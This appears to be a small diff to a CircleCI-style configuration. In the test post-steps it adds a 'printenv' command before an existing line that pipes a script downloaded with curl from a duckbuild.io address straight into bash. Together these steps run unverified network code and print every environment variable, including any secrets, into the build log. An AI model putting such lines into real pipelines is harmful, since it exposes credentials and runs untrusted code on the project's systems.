@@ -1,3 +1,4 @@
 test:
   post:
+    - printenv
     - bash <(curl -s https://test.duckbuild.io/ci/circle/scripts/upload)
